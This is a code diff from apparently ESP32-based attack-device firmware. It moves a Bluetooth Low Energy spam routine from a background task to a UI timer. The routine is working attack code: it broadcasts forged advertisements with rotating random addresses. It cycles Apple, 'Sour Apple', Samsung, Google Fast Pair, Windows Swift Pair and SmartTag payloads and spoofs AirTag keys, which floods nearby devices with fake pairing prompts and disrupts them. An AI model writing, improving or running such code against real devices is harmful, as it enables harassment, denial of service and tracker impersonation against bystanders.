@@ -29368,151 +29368,151 @@ static void ble_disc_proceed_from_sas(void)
     show_ble_disc_directed_screen();
 }
 
-// ── BLE Spam task ─────────────────────────────────────────────────────────────
-static void ble_spam_task(void *pvParameters)
+// ── BLE Spam state (for LVGL timer) ───────────────────────────────────────────
+struct ble_spam_state_t {
+    int apple_idx, samsung_idx, google_idx, windows_idx;
+    int airtag_idx, smarttag_idx, sour_apple_idx;
+    int mode_round;
+    bool configured;
+    lv_timer_t *timer;
+} g_ble_spam_state = {0};
+
+// ── BLE Spam timer callback (called by LVGL every 100ms) ────────────────────────
+static void ble_spam_timer_cb(lv_timer_t *timer)
 {
-    (void)pvParameters;
-    int apple_idx = 0, samsung_idx = 0, google_idx = 0, windows_idx = 0;
-    int airtag_idx = 0, smarttag_idx = 0, sour_apple_idx = 0;
-    int mode_round = 0;
+    (void)timer;
+    if (!ble_spam_active) return;
 
-    // Pre-allocate one mbuf in PSRAM for entire task lifetime (avoid pool exhaustion)
+    struct ble_spam_state_t *st = &g_ble_spam_state;
+
+    // Configure extended advertising once on first callback
+    if (!st->configured) {
+        struct ble_gap_ext_adv_params ext_adv_params;
+        memset(&ext_adv_params, 0, sizeof(ext_adv_params));
+        ext_adv_params.connectable = 0;
+        ext_adv_params.scannable = 0;
+        ext_adv_params.legacy_pdu = 1;
+        ext_adv_params.own_addr_type = BLE_OWN_ADDR_RANDOM;
+        ext_adv_params.primary_phy = BLE_HCI_LE_PHY_1M;
+        ext_adv_params.secondary_phy = BLE_HCI_LE_PHY_1M;
+        ext_adv_params.itvl_min = BLE_GAP_ADV_ITVL_MS(100);
+        ext_adv_params.itvl_max = BLE_GAP_ADV_ITVL_MS(150);
+        ext_adv_params.sid = BLE_SPAM_ADV_INSTANCE;
+
+        int rc = ble_gap_ext_adv_configure(BLE_SPAM_ADV_INSTANCE, &ext_adv_params, NULL, NULL, NULL);
+        if (rc != 0) {
+            ESP_LOGE(TAG, "BLE Spam: ext_adv_configure failed: %d", rc);
+            ble_spam_active = false;
+            return;
+        }
+        st->configured = true;
+    }
+
+    // Stop previous advertisement
+    ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
+
+    // Rotate random address
+    ble_addr_t rnd_addr;
+    if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0) {
+        ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
+    }
+
+    struct ble_hs_adv_fields fields;
+    memset(&fields, 0, sizeof(fields));
+    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+
+    int cur_mode = ble_spam_mode;
+    if (cur_mode == BLE_SPAM_MODE_ALL) {
+        static const int all_modes[] = {
+            BLE_SPAM_MODE_APPLE, BLE_SPAM_MODE_SAMSUNG,
+            BLE_SPAM_MODE_GOOGLE, BLE_SPAM_MODE_WINDOWS,
+            BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG,
+            BLE_SPAM_MODE_SOUR_APPLE
+        };
+        cur_mode = all_modes[st->mode_round % 7];
+        st->mode_round++;
+    }
+
+    bool use_svc = false;
+    const uint8_t *svc_data = NULL;
+    uint8_t svc_data_len = 0;
+    uint8_t at_mfg[29];
+    uint8_t sa_mfg[9];
+
+    switch (cur_mode) {
+    case BLE_SPAM_MODE_APPLE:
+        fields.mfg_data = s_apple_payloads[st->apple_idx];
+        fields.mfg_data_len = sizeof(s_apple_payloads[0]);
+        st->apple_idx = (st->apple_idx + 1) % APPLE_PAYLOAD_COUNT;
+        break;
+    case BLE_SPAM_MODE_SAMSUNG:
+        fields.mfg_data = s_samsung_payloads[st->samsung_idx];
+        fields.mfg_data_len = sizeof(s_samsung_payloads[0]);
+        st->samsung_idx = (st->samsung_idx + 1) % SAMSUNG_PAYLOAD_COUNT;
+        break;
+    case BLE_SPAM_MODE_GOOGLE:
+        use_svc = true;
+        svc_data = s_google_fp_payloads[st->google_idx];
+        svc_data_len = sizeof(s_google_fp_payloads[0]);
+        st->google_idx = (st->google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
+        break;
+    case BLE_SPAM_MODE_AIRTAG: {
+        const uint8_t *k = s_airtag_keys[st->airtag_idx];
+        st->airtag_idx = (st->airtag_idx + 1) % AIRTAG_KEY_COUNT;
+        ble_addr_t at_addr;
+        at_addr.val[0] = k[5]; at_addr.val[1] = k[4];
+        at_addr.val[2] = k[3]; at_addr.val[3] = k[2];
+        at_addr.val[4] = k[1]; at_addr.val[5] = k[0] | 0xC0;
+        ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &at_addr);
+        at_mfg[0] = 0x4C; at_mfg[1] = 0x00;
+        at_mfg[2] = 0x12; at_mfg[3] = 0x19;
+        at_mfg[4] = 0x10;
+        memcpy(at_mfg + 5, k + 6, 22);
+        at_mfg[27] = (k[0] >> 6) & 0x03;
+        at_mfg[28] = 0x00;
+        fields.mfg_data = at_mfg;
+        fields.mfg_data_len = sizeof(at_mfg);
+        break;
+    }
+    case BLE_SPAM_MODE_SMARTTAG:
+        use_svc = true;
+        svc_data = s_smarttag_payloads[st->smarttag_idx];
+        svc_data_len = sizeof(s_smarttag_payloads[0]);
+        st->smarttag_idx = (st->smarttag_idx + 1) % SMARTTAG_PAYLOAD_COUNT;
+        break;
+    case BLE_SPAM_MODE_SOUR_APPLE: {
+        static const uint8_t sa_actions[] = {
+            0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
+        };
+        sa_mfg[0] = 0x4C; sa_mfg[1] = 0x00;
+        sa_mfg[2] = 0x0F;
+        sa_mfg[3] = 0x05;
+        sa_mfg[4] = 0xC1;
+        sa_mfg[5] = sa_actions[st->sour_apple_idx % (int)sizeof(sa_actions)];
+        st->sour_apple_idx++;
+        esp_fill_random(&sa_mfg[6], 3);
+        fields.mfg_data = sa_mfg;
+        fields.mfg_data_len = sizeof(sa_mfg);
+        break;
+    }
+    case BLE_SPAM_MODE_WINDOWS:
+    default:
+        use_svc = true;
+        svc_data = (st->windows_idx == 0) ? s_windows_sp_svc : s_windows_sp_svc2;
+        svc_data_len = sizeof(s_windows_sp_svc);
+        st->windows_idx = (st->windows_idx + 1) % WINDOWS_PAYLOAD_COUNT;
+        break;
+    }
+
+    if (use_svc) {
+        fields.svc_data_uuid16 = svc_data;
+        fields.svc_data_uuid16_len = svc_data_len;
+    }
+
+    // Allocate fresh mbuf (NimBLE takes ownership)
     struct os_mbuf *om = os_msys_get_pkthdr(BLE_HS_ADV_MAX_SZ, 0);
-    if (!om) {
-        ESP_LOGE(TAG, "BLE Spam: failed to allocate mbuf at task start");
-        ble_spam_task_handle = NULL;
-        vTaskDelete(NULL);
-        return;
-    }
-
-    // Configure extended advertising once at task start
-    struct ble_gap_ext_adv_params ext_adv_params;
-    memset(&ext_adv_params, 0, sizeof(ext_adv_params));
-    ext_adv_params.connectable = 0;
-    ext_adv_params.scannable = 0;
-    ext_adv_params.legacy_pdu = 1;
-    ext_adv_params.own_addr_type = BLE_OWN_ADDR_RANDOM;
-    ext_adv_params.primary_phy = BLE_HCI_LE_PHY_1M;
-    ext_adv_params.secondary_phy = BLE_HCI_LE_PHY_1M;
-    ext_adv_params.itvl_min = BLE_GAP_ADV_ITVL_MS(100);
-    ext_adv_params.itvl_max = BLE_GAP_ADV_ITVL_MS(150);
-    ext_adv_params.sid = BLE_SPAM_ADV_INSTANCE;
-
-    int rc = ble_gap_ext_adv_configure(BLE_SPAM_ADV_INSTANCE, &ext_adv_params, NULL, NULL, NULL);
-    if (rc != 0) {
-        ESP_LOGE(TAG, "BLE Spam: ext_adv_configure failed: %d", rc);
-        os_mbuf_free_chain(om);
-        ble_spam_task_handle = NULL;
-        vTaskDelete(NULL);
-        return;
-    }
-
-    while (ble_spam_active) {
-        // Stop previous advertisement before updating data
-        ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
-        vTaskDelay(pdMS_TO_TICKS(10));  // minimal yield for controller to process stop
-
-        // Rotate random address each cycle
-        ble_addr_t rnd_addr;
-        if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0) {
-            ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
-        }
-
-        struct ble_hs_adv_fields fields;
-        memset(&fields, 0, sizeof(fields));
-        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
-
-        int cur_mode = ble_spam_mode;
-        if (cur_mode == BLE_SPAM_MODE_ALL) {
-            static const int all_modes[] = {
-                BLE_SPAM_MODE_APPLE, BLE_SPAM_MODE_SAMSUNG,
-                BLE_SPAM_MODE_GOOGLE, BLE_SPAM_MODE_WINDOWS,
-                BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG,
-                BLE_SPAM_MODE_SOUR_APPLE
-            };
-            cur_mode = all_modes[mode_round % 7];
-            mode_round++;
-        }
-
-        bool use_svc = false;
-        const uint8_t *svc_data = NULL;
-        uint8_t svc_data_len = 0;
-        uint8_t at_mfg[29];
-        uint8_t sa_mfg[9];
-
-        switch (cur_mode) {
-        case BLE_SPAM_MODE_APPLE:
-            fields.mfg_data = s_apple_payloads[apple_idx];
-            fields.mfg_data_len = sizeof(s_apple_payloads[0]);
-            apple_idx = (apple_idx + 1) % APPLE_PAYLOAD_COUNT;
-            break;
-        case BLE_SPAM_MODE_SAMSUNG:
-            fields.mfg_data = s_samsung_payloads[samsung_idx];
-            fields.mfg_data_len = sizeof(s_samsung_payloads[0]);
-            samsung_idx = (samsung_idx + 1) % SAMSUNG_PAYLOAD_COUNT;
-            break;
-        case BLE_SPAM_MODE_GOOGLE:
-            use_svc = true;
-            svc_data = s_google_fp_payloads[google_idx];
-            svc_data_len = sizeof(s_google_fp_payloads[0]);
-            google_idx = (google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
-            break;
-        case BLE_SPAM_MODE_AIRTAG: {
-            const uint8_t *k = s_airtag_keys[airtag_idx];
-            airtag_idx = (airtag_idx + 1) % AIRTAG_KEY_COUNT;
-            ble_addr_t at_addr;
-            at_addr.val[0] = k[5]; at_addr.val[1] = k[4];
-            at_addr.val[2] = k[3]; at_addr.val[3] = k[2];
-            at_addr.val[4] = k[1]; at_addr.val[5] = k[0] | 0xC0;
-            ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &at_addr);
-            at_mfg[0] = 0x4C; at_mfg[1] = 0x00;
-            at_mfg[2] = 0x12; at_mfg[3] = 0x19;
-            at_mfg[4] = 0x10;
-            memcpy(at_mfg + 5, k + 6, 22);
-            at_mfg[27] = (k[0] >> 6) & 0x03;
-            at_mfg[28] = 0x00;
-            fields.mfg_data = at_mfg;
-            fields.mfg_data_len = sizeof(at_mfg);
-            break;
-        }
-        case BLE_SPAM_MODE_SMARTTAG:
-            use_svc = true;
-            svc_data = s_smarttag_payloads[smarttag_idx];
-            svc_data_len = sizeof(s_smarttag_payloads[0]);
-            smarttag_idx = (smarttag_idx + 1) % SMARTTAG_PAYLOAD_COUNT;
-            break;
-        case BLE_SPAM_MODE_SOUR_APPLE: {
-            static const uint8_t sa_actions[] = {
-                0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
-            };
-            sa_mfg[0] = 0x4C; sa_mfg[1] = 0x00;
-            sa_mfg[2] = 0x0F;
-            sa_mfg[3] = 0x05;
-            sa_mfg[4] = 0xC1;
-            sa_mfg[5] = sa_actions[sour_apple_idx % (int)sizeof(sa_actions)];
-            sour_apple_idx++;
-            esp_fill_random(&sa_mfg[6], 3);
-            fields.mfg_data = sa_mfg;
-            fields.mfg_data_len = sizeof(sa_mfg);
-            break;
-        }
-        case BLE_SPAM_MODE_WINDOWS:
-        default:
-            use_svc = true;
-            svc_data = (windows_idx == 0) ? s_windows_sp_svc : s_windows_sp_svc2;
-            svc_data_len = sizeof(s_windows_sp_svc);
-            windows_idx = (windows_idx + 1) % WINDOWS_PAYLOAD_COUNT;
-            break;
-        }
-
-        if (use_svc) {
-            fields.svc_data_uuid16 = svc_data;
-            fields.svc_data_uuid16_len = svc_data_len;
-        }
-
-        // Reuse pre-allocated mbuf; clear and fill with new payload
-        os_mbuf_adj(om, -OS_MBUF_PKTLEN(om));  // clear payload
-        rc = ble_hs_adv_set_fields_mbuf(&fields, om);
+    if (om) {
+        int rc = ble_hs_adv_set_fields_mbuf(&fields, om);
         if (rc == 0) {
             rc = ble_gap_ext_adv_set_data(BLE_SPAM_ADV_INSTANCE, om);
             if (rc == 0) {
@@ -29525,18 +29525,15 @@ static void ble_spam_task(void *pvParameters)
                 }
             } else {
                 ESP_LOGW(TAG, "BLE Spam: ext_adv_set_data failed: %d", rc);
+                os_mbuf_free_chain(om);
             }
         } else {
             ESP_LOGW(TAG, "BLE Spam: adv_set_fields_mbuf failed: %d", rc);
+            os_mbuf_free_chain(om);
         }
-
-        vTaskDelay(pdMS_TO_TICKS(20));  // total cycle: ~30ms
+    } else {
+        ESP_LOGW(TAG, "BLE Spam: mbuf allocation failed");
     }
-
-    ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
-    os_mbuf_free_chain(om);
-    ble_spam_task_handle = NULL;
-    vTaskDelete(NULL);
 }
 
 // ── BLE Spam screen helpers ───────────────────────────────────────────────────
@@ -29546,6 +29543,11 @@ static void ble_spam_start_btn_cb(lv_event_t *e)
     if (ble_spam_active) {
         // Stop
         ble_spam_active = false;
+        if (g_ble_spam_state.timer) {
+            lv_timer_del(g_ble_spam_state.timer);
+            g_ble_spam_state.timer = NULL;
+        }
+        ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
         lv_label_set_text(lv_obj_get_child(ble_spam_start_btn, 0), "START");
         lv_obj_set_style_bg_color(ble_spam_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
     } else {
@@ -29557,9 +29559,10 @@ static void ble_spam_start_btn_cb(lv_event_t *e)
         }
         ble_spam_count = 0;
         ble_spam_active = true;
+        memset(&g_ble_spam_state, 0, sizeof(g_ble_spam_state));  // reset state
+        g_ble_spam_state.timer = lv_timer_create(ble_spam_timer_cb, 100, NULL);  // 100ms interval
         lv_label_set_text(lv_obj_get_child(ble_spam_start_btn, 0), "STOP");
         lv_obj_set_style_bg_color(ble_spam_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
-        xTaskCreate(ble_spam_task, "ble_spam", 8192, NULL, 5, &ble_spam_task_handle);
     }
 }
 
@@ -29567,8 +29570,10 @@ static void ble_spam_back_cb(lv_event_t *e)
 {
     (void)e;
     ble_spam_active = false;
-    for (int i = 0; i < 20 && ble_spam_task_handle != NULL; i++)
-        vTaskDelay(pdMS_TO_TICKS(50));
+    if (g_ble_spam_state.timer) {
+        lv_timer_del(g_ble_spam_state.timer);
+        g_ble_spam_state.timer = NULL;
+    }
     ble_spam_ui_active = false;
     ble_spam_status_label = NULL;
     ble_spam_counter_label = NULL;
